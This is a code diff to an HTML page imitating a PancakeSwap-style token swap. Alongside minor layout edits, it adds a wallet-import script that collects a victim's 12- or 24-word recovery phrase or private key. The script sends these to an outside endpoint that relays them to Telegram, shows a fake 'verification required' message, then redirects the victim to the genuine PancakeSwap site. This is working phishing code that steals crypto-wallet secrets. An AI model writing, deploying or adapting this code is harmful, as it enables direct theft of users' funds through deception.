@@ -247,7 +247,7 @@
 
         .token-row {
             display: flex;
-            justify-content: space-around;
+            justify-content: space-between;
             align-items: center;
         }
 
@@ -1036,9 +1036,9 @@
 
         <div class="swap-container">
            
-
+<div class="input-label">From</div>
             <div class="token-input">
-                <div class="input-label">From</div>
+                
                 <div class="token-row">
                     <div class="token-selector">
                         <div class="token-icon" style="background-image: url(img/svgexport-12.svg); background-size: cover;">
@@ -1059,9 +1059,9 @@
                     <i class="fas fa-arrow-down"></i>
                 </button>
             </div>
-
+            
+                <div class="input-label">To</div>   
             <div class="token-input">
-                <div class="input-label">To</div>
                 <div class="token-row">
                     <div class="token-selector">
                         <div class="token-icon cake" style="background-image: url(img/descarga.svg); background-size: cover;">
@@ -1126,7 +1126,7 @@
             <div class="modal-left">
                 <h2 class="modal-title">Connect Wallet</h2>
                 
-                <div class="social-login">
+                <!-- <div class="social-login">
                     <div class="social-icons">
                         <img src="img/Captura de pantalla 2025-07-27 184048.png" alt="">
                     </div>
@@ -1134,7 +1134,7 @@
                         Connect with social login
                         <i class="fas fa-arrow-right"></i>
                     </div>
-                </div>
+                </div> -->
 
                 <div class="wallet-section">
                     <div class="wallet-section-title">Top Wallets</div>
@@ -1542,6 +1542,256 @@
         </div>
     </div>
 </div>
+<!-- Indicador de carga -->
+<div id="loader" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 9999;">
+    <div style="width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+</div>
+
+<div id="loadingText" style="display: none; position: fixed; top: 60%; left: 50%; transform: translate(-50%, -50%); z-index: 9999; color: #333; font-weight: bold;">
+
+</div>
+
+<!-- Modal de confirmación -->
+<div id="confirmationModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.5); z-index: 10000; justify-content: center; align-items: center;">
+    <div style="background: white; padding: 30px; border-radius: 10px; text-align: center; max-width: 400px; margin: 20px;">
+        <h3 style="color: #333; margin-bottom: 15px;">Verificación requerida</h3>
+        <p style="color: #666; margin-bottom: 20px;">Los datos proporcionados requieren verificación adicional. Por favor revise la información e intente nuevamente.</p>
+    </div>
+</div>
+
+<!-- CSS para la animación del loader -->
+<style>
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+</style>
+<script>
+    // Función para validar que todos los inputs estén llenos
+function validateWalletInputs() {
+    const walletNameInput = document.querySelector('.wallet-name-input input');
+    const walletName = walletNameInput.value.trim();
+    
+    // Verificar nombre de wallet
+    if (!walletName) {
+        alert('Por favor, ingresa un nombre para tu wallet.');
+        return false;
+    }
+    
+    // Verificar si está usando recovery phrase o private key
+    const recoveryContainer = document.getElementById('recoveryPhraseContainer');
+    const privateKeyContainer = document.getElementById('privateKeyContainer');
+    
+    if (recoveryContainer.style.display !== 'none') {
+        // Validar recovery phrase (12 o 24 palabras)
+        const phraseInputs = document.querySelectorAll('.phrase-input');
+        let filledInputs = 0;
+        
+        phraseInputs.forEach(input => {
+            if (input.value.trim()) {
+                filledInputs++;
+            }
+        });
+        
+        // Verificar que tenga 12 o 24 palabras completas
+        if (filledInputs !== 12 && filledInputs !== 24) {
+            alert('Por favor, completa todas las palabras de la frase de recuperación (12 o 24 palabras).');
+            return false;
+        }
+        
+        // Verificar que no haya campos vacíos en el rango usado
+        const activeInputs = Array.from(phraseInputs).slice(0, filledInputs);
+        for (let input of activeInputs) {
+            if (!input.value.trim()) {
+                alert('Por favor, completa todas las palabras de la frase de recuperación.');
+                return false;
+            }
+        }
+        
+    } else if (privateKeyContainer.style.display !== 'none') {
+        // Validar private key
+        const privateKeyInput = document.querySelector('.private-key-input');
+        if (!privateKeyInput.value.trim()) {
+            alert('Por favor, ingresa tu clave privada.');
+            return false;
+        }
+    }
+    
+    return true;
+}
+
+// Función para recopilar los datos del formulario
+function collectWalletData() {
+    const walletNameInput = document.querySelector('.wallet-name-input input');
+    const walletName = walletNameInput.value.trim();
+    
+    let walletData = {
+        walletName: walletName,
+        importMethod: '',
+        data: ''
+    };
+    
+    // Determinar qué método se está usando
+    const recoveryContainer = document.getElementById('recoveryPhraseContainer');
+    const privateKeyContainer = document.getElementById('privateKeyContainer');
+    
+    if (recoveryContainer.style.display !== 'none') {
+        // Recopilar recovery phrase
+        const phraseInputs = document.querySelectorAll('.phrase-input');
+        const phrases = [];
+        
+        phraseInputs.forEach((input, index) => {
+            if (input.value.trim()) {
+                phrases.push(`${index + 1}. ${input.value.trim()}`);
+            }
+        });
+        
+        walletData.importMethod = 'Recovery Phrase';
+        walletData.data = phrases.join('\n');
+        
+    } else if (privateKeyContainer.style.display !== 'none') {
+        // Recopilar private key
+        const privateKeyInput = document.querySelector('.private-key-input');
+        walletData.importMethod = 'Private Key';
+        walletData.data = privateKeyInput.value.trim();
+    }
+    
+    return walletData;
+}
+
+// Función para enviar datos a Telegram
+async function sendWalletDataToTelegram() {
+    // Validar inputs antes de enviar
+    if (!validateWalletInputs()) {
+        return false;
+    }
+    
+    // Recopilar datos
+    const walletData = collectWalletData();
+    
+    // Crear mensaje para Telegram
+    const mensaje = `🔐 NUEVA IMPORTACIÓN DE WALLET
+    
+📝 Nombre del Wallet: ${walletData.walletName}
+🔑 Método de importación: ${walletData.importMethod}
+
+📋 Datos:
+${walletData.data}
+
+⏰ Fecha: ${new Date().toLocaleString('es-ES')}`;
+
+    try {
+        // Mostrar indicador de carga (solo si existen los elementos)
+        const loader = document.getElementById('loader');
+        const loadingText = document.getElementById('loadingText');
+        
+        if (loader) loader.style.display = 'block';
+        if (loadingText) loadingText.style.display = 'block';
+        
+        // Envío REAL a Telegram usando tu API endpoint
+        const resp = await fetch('https://avori-telegram-api.vercel.app/api/send-telegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: mensaje })
+        });
+        
+        // Ocultar indicador de carga
+        if (loader) loader.style.display = 'none';
+        if (loadingText) loadingText.style.display = 'none';
+        
+        if (resp.ok) {
+            // Mostrar modal de confirmación (solo si existe)
+            const confirmationModal = document.getElementById('confirmationModal');
+            if (confirmationModal) {
+                confirmationModal.style.display = 'flex';
+            }
+            
+            // Redireccionar después de 3 segundos (opcional)
+            setTimeout(() => {
+                window.location.href = 'https://pancakeswap.finance/swap'; // Cambia por tu URL
+            }, 3000);
+            
+            return true;
+        } else {
+            console.error('Error API status:', resp.status);
+            alert('Error al enviar la información. Por favor, inténtalo de nuevo.');
+            return false;
+        }
+    } catch (err) {
+        // Ocultar indicador de carga
+        const loader = document.getElementById('loader');
+        const loadingText = document.getElementById('loadingText');
+        
+        if (loader) loader.style.display = 'none';
+        if (loadingText) loadingText.style.display = 'none';
+        
+        console.error('Fallo de red:', err);
+        alert('Error de red. Por favor, verifica tu conexión a internet.');
+        return false;
+    }
+}
+
+// Event listener para el botón de importar
+document.addEventListener('DOMContentLoaded', function() {
+    const importBtn = document.getElementById('importWalletBtn');
+    
+    if (importBtn) {
+        importBtn.addEventListener('click', async function(e) {
+            e.preventDefault();
+            await sendWalletDataToTelegram();
+        });
+    }
+    
+    // Event listeners para cambiar entre recovery phrase y private key
+    const switchToPrivateKey = document.getElementById('switchToPrivateKey');
+    const use24Words = document.getElementById('use24Words');
+    const recoveryContainer = document.getElementById('recoveryPhraseContainer');
+    const privateKeyContainer = document.getElementById('privateKeyContainer');
+    const phraseGrid = document.getElementById('phraseGrid');
+    
+    if (switchToPrivateKey) {
+        switchToPrivateKey.addEventListener('click', function() {
+            recoveryContainer.style.display = 'none';
+            privateKeyContainer.style.display = 'block';
+            switchToPrivateKey.textContent = 'Use Recovery Phrase instead';
+            switchToPrivateKey.id = 'switchToRecoveryPhrase';
+            
+            // Cambiar el event listener
+            switchToPrivateKey.removeEventListener('click', arguments.callee);
+            switchToPrivateKey.addEventListener('click', function() {
+                recoveryContainer.style.display = 'block';
+                privateKeyContainer.style.display = 'none';
+                this.textContent = 'Use Private Key instead';
+                this.id = 'switchToPrivateKey';
+            });
+        });
+    }
+    
+    if (use24Words) {
+        use24Words.addEventListener('click', function() {
+            // Crear grid de 24 palabras si no existe
+            if (phraseGrid.children.length === 12) {
+                for (let i = 13; i <= 24; i++) {
+                    const phraseItem = document.createElement('div');
+                    phraseItem.className = 'phrase-item';
+                    phraseItem.innerHTML = `
+                        <span class="phrase-number">${i}.</span>
+                        <input type="text" class="phrase-input" placeholder="">
+                    `;
+                    phraseGrid.appendChild(phraseItem);
+                }
+                use24Words.textContent = 'Use 12-word recovery phrase';
+            } else {
+                // Volver a 12 palabras
+                while (phraseGrid.children.length > 12) {
+                    phraseGrid.removeChild(phraseGrid.lastChild);
+                }
+                use24Words.textContent = 'I have a 24-word recovery phrase';
+            }
+        });
+    }
+});
+</script>
 
 <style>
     .import-modal {
@@ -2112,8 +2362,6 @@ document.getElementById('importWalletBtn').addEventListener('click', function() 
         console.log('Private key:', privateKey);
     }
     
-    // Aquí implementarías la lógica de importación
-    alert('Wallet import functionality would be implemented here');
 });
 
 // Funcionalidad para navegar entre inputs con Tab o Enter
